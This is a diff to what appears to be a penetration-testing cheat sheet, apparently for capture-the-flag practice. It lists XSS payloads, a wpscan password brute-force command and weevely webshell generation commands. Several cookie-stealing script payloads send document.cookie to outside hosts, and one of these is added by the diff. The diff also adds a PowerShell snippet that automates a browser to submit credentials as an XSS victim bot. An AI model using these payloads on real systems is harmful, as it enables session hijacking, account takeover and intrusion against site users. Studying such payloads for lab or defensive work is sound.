@@ -42,6 +42,7 @@ xmlrpc -P /usr/share/wordlists/fasttrack.txt -o wpscan.txt
 SVG - No spaces----<svg/OnLoad="`${prompt``}`">
 Cookie Stealing----<script>document.write('<img src="https://www.hooperlabs.xyz/cookie?' + document.cookie + '">')</script>
 Cookie Stealing----<iframe src=http://10.2.188.2 onload="this.src='http://10.2.188.2?' + document.cookie">
+Cookie Stealing----<script>new Image().src="http://10.1.1.1/?cookie="+document.cookie;</script>
 
 XSS Web Request----http://challenge.acictf.com:61470/search?search=foo&foobarh00p%3Csvg//onload%3d%22alert(1)%22%3E=%3Cscript%3E
 SVG - No spaces----<svg/OnLoad="`${prompt``}`">
@@ -71,3 +72,6 @@ Download all files (wget)----wget -r -np -k &lt;URL&gt;
 ##Webshells
 Generate password-protected webshell (weevely)----weevely generate mysecretpassword <path>
 Interact with weevely webshell----weevely <url> mysecretpassword
+
+##Create an XSS Victim Bot
+PowerShell Bot to Execute JS----##$ie = New-Object -com InternetExplorer.Application; $ie.visible=$true; $ie.navigate("http://vulnerable.com"); while($ie.ReadyState -ne 4){ start-sleep -m 1000 }; $ie.document.getElementsByName("username")[0].value="foo"; $ie.document.getElementsByName("password")[0].value="bar"; $ie.document.getElementsByClassName("btn")[0].click(); $ie.Quit(); [System.Runtime.Interopservices.Marshall]::ReleaseComObject($ie); #Note... may need sleep statements
